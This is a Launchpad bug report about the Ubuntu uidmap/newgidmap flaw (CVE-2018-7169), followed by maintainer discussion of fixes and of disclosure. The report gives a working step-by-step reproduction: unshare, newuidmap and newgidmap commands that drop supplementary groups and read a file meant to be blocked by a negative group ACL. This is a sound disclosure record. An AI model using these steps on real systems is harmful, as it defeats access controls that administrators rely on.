  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>Distribution: Ubuntu 16.04.3 LTS<br />
Kernel: 4.4.0-97-generic<br />
uidmap package version: 1:4.2-3.1ubuntu5.3</p>
<p>The newgidmap setuid executable allows any user to write a single mapping line to the gid_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process&#x27;s own GID outside of the user namespace to GID 0 inside the user namespace.</p>
<p>Newgidmap will write the mapping regardless of the content of /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups, which will initially contain the string &quot;allow&quot;. After this mapping is performed, and also after the process&#x27; uid_map is written with newuidmap, the process in the user namespace will be able to use the setgroups system call to drop supplementary groups.</p>
<p>This is possible even if there is no entry for the user in /etc/subgid, because no subordinate GIDs are actually being used.</p>
<p>This allows any user to circumvent the use of supplementary groups as blacklists, e.g. for some file owned by root:blacklist with permission bits 0604 (octal). Normally any process whose identity included the group &quot;blacklist&quot; in its supplementary groups would not be able to read that file. By performing this exploit using newgidmap, they can drop all supplementary groups and read that file.</p>
<p>If newgidmap was not available, unprivileged users would not be able to write a process&#x27;s gid_map until writing &quot;deny&quot; to /proc/$<wbr />pid/setgroups. A fix for this might be for newgidmap to check the content of /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups is &quot;deny&quot;, but we have not tried to patch this ourselves.</p>
<p>An example using 2 login shells for a user named &quot;someone&quot; on Ubuntu Xenial, with the uidmap package installed:</p>
<p>Shell 1</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ id<br />
uid=1001(someone) gid=1001(someone) groups=<wbr />1001(someone)<wbr />,1002(restricte<wbr />d)</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ ls -al /tmp/should_<wbr />restrict<br />
-rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_<wbr />restrict</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /tmp/should_<wbr />restrict<br />
cat: /tmp/should_<wbr />restrict: Permission denied</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ unshare -U --setgroups allow # /proc/self/<wbr />setgroups already contains &#x27;allow&#x27;, but let&#x27;s be explicit</p>
<p>nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ echo $$<br />
1878</p>
<p>Shell 2</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /etc/subuid<br />
lxd:100000:65536<br />
root:100000:65536<br />
ubuntu:165536:65536</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /etc/subgid<br />
lxd:100000:65536<br />
root:100000:65536<br />
ubuntu:165536:65536</p>
<p># There are no entries in /etc/sub{u,g}id for someone, but this doesn&#x27;t matter that much as subordinate IDs are not being requested.</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ newuidmap 1878 0 1001 1</p>
<p>someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ newgidmap 1878 0 1001 1</p>
<p>Back to shell 1</p>
<p>nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ id<br />
uid=0(root) gid=0(root) groups=<wbr />0(root)<wbr />,65534(<wbr />nogroup)</p>
<p># The presence of the &quot;nogroup&quot; supplementary group indicates that some unmapped GIDs are present as supplementary GIDs. The kernel knows that this process still has &quot;restricted&quot; in its supplementary groups, so it can&#x27;t read the restricted file yet.</p>
<p>nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /tmp/should_<wbr />restrict<br />
cat: /tmp/should_<wbr />restrict: Permission denied</p>
<p># The process has gained CAP_SETGID in its user namespace by becoming UID 0. /proc/$<wbr />pid/setgroups contains &quot;allow&quot;, so it can call setgroups(2). By su-ing to root (itself, in the user namespace), it can drop the supplementary groups. It can&#x27;t read /root/.bashrc as that file is owned by UID 0 in the initial user namespace, which creates some distracting error output but doesn&#x27;t matter in this case.</p>
<p>nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ su root<br />
su: Authentication failure<br />
(Ignored)<br />
bash: /root/.bashrc: Permission denied</p>
<p># Supplementary groups have been dropped</p>
<p>root@ubuntu-<wbr />xenial:<wbr />~# id<br />
uid=0(root) gid=0(root) groups=0(root)</p>
<p># It can read the restricted file</p>
<p>root@ubuntu-<wbr />xenial:<wbr />~# cat /tmp/should_<wbr />restrict<br />
content</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
          
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2018-7169" title="An issue was discovered in shadow 4.5...">2018-7169</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~seth-arnold" class="sprite person">Seth Arnold (seth-arnold)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-02T01:18:21.934689+00:00" title="2017-11-02 01:18:21 UTC">on 2017-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Craig, interesting finding, thanks for reporting it to us.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Craig, interesting finding, thanks for reporting it to us.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T19:20:16.416601+00:00" title="2017-11-07 19:20:16 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi,</p>
<p>thanks for pointing this out.</p>
<p>would you mind posting a patch to fix this?</p>
<p>It looks like a real bug, except I&#x27;m a bit confused as to how this features is supposed to be used in the first place.  The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right?  But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.</p>
<p>In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap.  Does that seem reasonable?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi,

thanks for pointing this out.

would you mind posting a patch to fix this?

It looks like a real bug, except I'm a bit confused as to how this features is supposed to be used in the first place.  The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right?  But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.

In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap.  Does that seem reasonable?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T19:33:25.578354+00:00" title="2017-11-07 19:33:25 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.</p>
<p>Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that&#x27;d be suitable for a security upload.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.

Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that'd be suitable for a security upload.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T19:50:48+00:00" title="2017-11-07 19:50:48 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/4">
                <strong>Re: [Bug 1729357] Re: unprivileged user can drop supplementary groups</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@stgraber,</p>
<p>Still trying to wrap my head around whether this currently actually<br />
works.  Can you verify that you can use setgroups=deny with a negative<br />
acl in the initial user_ns to prevent a user doing the equivalent of<br />
lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@stgraber,

Still trying to wrap my head around whether this currently actually
works.  Can you verify that you can use setgroups=deny with a negative
acl in the initial user_ns to prevent a user doing the equivalent of
lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T21:08:25.205657+00:00" title="2017-11-07 21:08:25 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I think you could but we don&#x27;t have any PAM module that lets you do that today.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I think you could but we don't have any PAM module that lets you do that today.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T21:09:38.902094+00:00" title="2017-11-07 21:09:38 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, actually, according to <a rel="nofollow" href="https://lwn.net/Articles/626665/">https:/<wbr />/lwn.net/<wbr />Articles/<wbr />626665/</a> the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who&#x27;s in the host namespace...</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh, actually, according to https://lwn.net/Articles/626665/ the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who's in the host namespace...</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-07T21:15:20.325129+00:00" title="2017-11-07 21:15:20 UTC">on 2017-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thinking about this problem a bit, it certainly sounds like for the normal case we&#x27;d want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.</p>
<p>The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid_map and keep setgroups allowed. That&#x27;s what we need for fully unprivileged LXC containers.</p>
<p>My current thought here is that we&#x27;d effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thinking about this problem a bit, it certainly sounds like for the normal case we'd want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.

The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid_map and keep setgroups allowed. That's what we need for fully unprivileged LXC containers.

My current thought here is that we'd effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman (craigpivotal)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-08T17:03:50.007835+00:00" title="2017-11-08 17:03:50 UTC">on 2017-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap *won&#x27;t* set /proc/$<wbr />pid/setgroups to deny for.</p>
<p>Serge, I&#x27;m not much of a C programmer but I&#x27;d be happy to try writing a patch once we decide on the solution.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap *won't* set /proc/$pid/setgroups to deny for.

Serge, I'm not much of a C programmer but I'd be happy to try writing a patch once we decide on the solution.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~seth-arnold" class="sprite person">Seth Arnold (seth-arnold)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-14T01:56:07.027356+00:00" title="2017-11-14 01:56:07 UTC">on 2017-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Eric W. Biederman contributed this via email:</p>
<p><span class="foldable-quoted">&gt; The short answer is that if you want negative acls to work don&#x27;t try and<br />
&gt; apply them to a user in /etc/subuid or /etc/subgid.<br />
&gt;<br />
&gt; To my knowledge there is not a good solution to this problem.<br />
&gt;<br />
&gt; As for setting setgroups to deny that is the default setting if you do<br />
&gt; nothing.  Allow can&#x27;t be set until the gid map is set.  Plus there<br />
&gt; are some inheritence rules that ensure if your parent has deny set you<br />
&gt; always will have deny set.<br />
&gt;<br />
&gt; To date in my experience negative group acls are a theoretical construct<br />
&gt; that no one actually uses.
</span></p>
<p>Given that there&#x27;s no clear solution to this problem I&#x27;m going to make<br />
this bug public, so others can know that subtracting permissions via group<br />
membership isn&#x27;t perfect.</p>
<p>Thanks</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Eric W. Biederman contributed this via email:

&gt; The short answer is that if you want negative acls to work don't try and
&gt; apply them to a user in /etc/subuid or /etc/subgid.
&gt; 
&gt; To my knowledge there is not a good solution to this problem.
&gt; 
&gt; As for setting setgroups to deny that is the default setting if you do
&gt; nothing.  Allow can't be set until the gid map is set.  Plus there
&gt; are some inheritence rules that ensure if your parent has deny set you
&gt; always will have deny set.
&gt; 
&gt; To date in my experience negative group acls are a theoretical construct
&gt; that no one actually uses.

Given that there's no clear solution to this problem I'm going to make
this bug public, so others can know that subtracting permissions via group
membership isn't perfect.

Thanks
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in shadow (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman (craigpivotal)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-11-17T16:18:03.175825+00:00" title="2017-11-17 16:18:03 UTC">on 2017-11-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for replying Eric, but I&#x27;m having trouble reproducing what you&#x27;ve posted. I can&#x27;t write the gid map until I&#x27;ve written deny to /prod/$<wbr />pid/setgroups, not the other way around. There might be some nuance I&#x27;ve missed.</p>
<p>Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.</p>
<p>What if newgidmap wrote &quot;deny&quot; to /proc/$<wbr />pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for replying Eric, but I'm having trouble reproducing what you've posted. I can't write the gid map until I've written deny to /prod/$pid/setgroups, not the other way around. There might be some nuance I've missed.

Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.

What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

